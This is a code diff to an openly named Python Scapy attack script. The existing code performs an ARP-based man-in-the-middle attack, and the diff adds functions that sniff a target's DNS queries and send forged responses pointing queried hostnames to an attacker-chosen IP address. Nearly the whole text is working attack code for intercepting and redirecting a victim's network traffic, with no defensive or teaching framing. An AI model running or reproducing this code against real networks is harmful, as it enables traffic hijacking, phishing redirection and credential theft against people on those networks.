@@ -1,4 +1,5 @@
 from scapy.all import *
+from scapy.all import DNS, DNSQR, IP, send, IPv6, sr, UDP, sniff, DNSRR, sendp, Ether, srp1, ARP
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 import threading
 import time
@@ -66,5 +67,57 @@ def mitm_attack(victims):
 
     return th
 
+def dns_sniffer():
+
+    #This function is responsible for sniffing for DNS packets and forwarding them to the spoofer. 
+
+	global target_ip
+	sniff(filter="udp and port 53 and host " + target_ip, prn=dns_spoofer)
+
+def dns_spoofer(p):
+
+    #This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
+
+	global target_ip, g_router_ip, ip_to_spoof
+
+	if (p[IP].src == target_ip and
+		p.haslayer(DNS) and
+		p[DNS].qr == 0 and				# DNS Query
+		p[DNS].opcode == 0 and			# DNS Standard Query
+		p[DNS].ancount == 0				# Answer Count
+		
+		):
+
+		print("Sending spoofed DNS response")
+
+		if (p.haslayer(IPv6)):
+			ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
+		else:
+			ip_layer = IP(src=p[IP].dst, dst=p[IP].src)
+
+
+		# Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
+		dns_resp =  ip_layer/ \
+					UDP(
+						dport=p[UDP].sport,
+						sport=53
+						)/ \
+					DNS(
+						id=p[DNS].id,					# Same as query
+						ancount=1,						# Number of answers
+						qr=1,							# DNS Response
+						ra=1,							# Recursion available
+						qd=(p.getlayer(DNS)).qd,		# Query Data
+						an=DNSRR(
+							rrname=p[DNSQR].qname,	# Queried host name
+							rdata=ip_to_spoof,	# IP address of queried host name
+							ttl = 10
+							)
+						)
+
+		# Send the spoofed DNS response
+		print(dns_resp.show())
+		send(dns_resp, verbose=0)
+		print(f"Resolved DNS request for {p[DNS].qd.qname} by {ip_to_spoof}")
 
 threat = mitm_attack(targets)
